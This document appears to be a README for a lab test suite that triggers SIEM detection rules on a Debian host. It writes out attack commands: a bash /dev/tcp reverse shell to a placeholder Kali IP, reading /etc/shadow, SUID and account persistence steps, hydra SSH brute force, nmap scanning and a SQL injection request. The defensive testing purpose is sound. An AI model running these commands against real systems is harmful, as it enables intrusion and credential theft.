# Linux Test Suite

## Automated Run (Recommended)
Run from the extracted bundle on the Debian/Linux host:
```bash
sudo bash scripts/test-linux-detections.sh <KALI_IP>
```
- Runs all local host detections and cleans up temporary files/users automatically.
- Pauses and prints the exact **Kali** commands for reverse shell (`102009`), SSH brute force (`102002`), Nmap (`102017`/`102019`), and optional root SSH (`102003`, auto-reverting `PermitRootLogin`).

---

## 1. Individualized Tests (Included in Script)

### 1. Host Discovery (`102013`)
```bash
whoami; uname -a; cat /etc/passwd >/dev/null; ss -tulpn >/dev/null
```
- **Check**: `rule.id:102013` (Level 7)

### 2. Temp & Hidden Dot-Directory Execution (`102008`, `102022`)
```bash
printf '#!/bin/sh\nid\n' > /tmp/redteam_bin.sh && chmod +x /tmp/redteam_bin.sh && /tmp/redteam_bin.sh && rm -f /tmp/redteam_bin.sh
mkdir -p /tmp/.ccdc_hidden && printf '#!/bin/sh\nid\n' > /tmp/.ccdc_hidden/run.sh && chmod +x /tmp/.ccdc_hidden/run.sh && /tmp/.ccdc_hidden/run.sh && rm -rf /tmp/.ccdc_hidden
```
- **Check**: `rule.id:(102008 OR 102022)` (Level 12)

### 3. Parent -> Shell Reverse Shell Pattern (`102018`)
```bash
python3 -c 'import subprocess; subprocess.run(["/bin/sh", "-c", "id"])'
```
- **Check**: `rule.id:102018` (Level 12)

### 4. Persistence & Account Manipulation (`102001`, `102006`, `102010`, `5901`, `5902`)
```bash
sudo touch /etc/cron.d/redteam_test && sudo useradd testred && sudo mkdir -p /root/.ssh && sudo touch /root/.ssh/authorized_keys
sudo rm -f /etc/cron.d/redteam_test && sudo userdel testred
```
- **Check**: `rule.id:(102001 OR 102006 OR 102010 OR 5902)` (Level 8–12)

### 5. `/etc/shadow` Read & SUID Abuse (`102012`)
```bash
sudo cat /etc/shadow >/dev/null
cp /bin/true /tmp/suid_test && sudo chmod +s /tmp/suid_test && rm -f /tmp/suid_test
```
- **Check**: `rule.id:102012` (Level 12)

### 6. Archive Staging (`102014`)
```bash
tar -czf /tmp/loot_test.tar.gz /etc/passwd 2>/dev/null && rm -f /tmp/loot_test.tar.gz
```
- **Check**: `rule.id:102014` (Level 10)

### 7. Package Management (`102005`)
```bash
sudo apt-get install -y sl && sudo apt-get remove -y sl
```
- **Check**: `rule.id:102005` (Level 7)

### 8. Reverse Shell (`102009`) + Live Port/Process Check
On **Kali**: `nc -lvnp 4444`  
On **Debian**:
```bash
bash -c 'bash -i >& /dev/tcp/<KALI_IP>/4444 0>&1'
```
- **Check**: `rule.id:102009` (Level 11) + **Dev Tools**: `GET /syscollector/000/ports?remote.ip=<KALI_IP>`

### 9. SSH Brute Force (`102002`) & Nmap Port Scan (`102017`, `102019`)
On **Kali**:
```bash
hydra -l fakeuser -P /usr/share/wordlists/fasttrack.txt -t 4 -f ssh://<DEBIAN_IP>
nmap -Pn -p 1-50 <DEBIAN_IP>
```
- **Check**: `rule.id:(102002 OR 102017 OR 102019)` (Requires `ufw logging on` / `firewalld` for `102017`/`102019`)

### 10. Root SSH Login (`102003`)
Temporarily set `PermitRootLogin yes` in `/etc/ssh/sshd_config`, `sudo systemctl restart ssh`, run `ssh root@<DEBIAN_IP>` from Kali, then revert.
- **Check**: `rule.id:102003` (Level 12, `data.srcip`)

---

## 2. Manual / Additional Tests (Outside Script)

- **Interactive `su` to root (`102004`)**: From a non-root user on Debian, run `su -`.
- **Service / Firewall Tampering (`102021`)**: Run `sudo systemctl stop <non_critical_svc>` or `sudo /usr/sbin/ufw disable` (re-enable immediately).
- **System Binary FIM (`102020`)**: Touch/modify a test file in `/usr/local/bin/` or verify hash changes in `/bin`, `/sbin`, `/usr/bin`, `/usr/sbin` after a `300s` FIM scan.
- **Web / Mail / DB (`102007`, `102011`, `102015`, `102016`)** *(on web/mail/ecom hosts)*:
  - `102007`: `sudo touch /var/www/html/test.php`
  - `102011`: `sudo touch /etc/postfix/test_conf`
  - `102015`: Trigger web app RCE spawning `/bin/sh`
  - `102016`: `curl -s "http://<TARGET_IP>/?id=1%20union%20select%201,2,3"`
- **Local Noise Suppression (`100200`–`100202`)**: Run `sudo apt-get update` and `touch /tmp/noise_test && rm -f /tmp/noise_test` — confirm **no** FIM alerts appear for `/var/lib/apt/` or `/tmp/`.
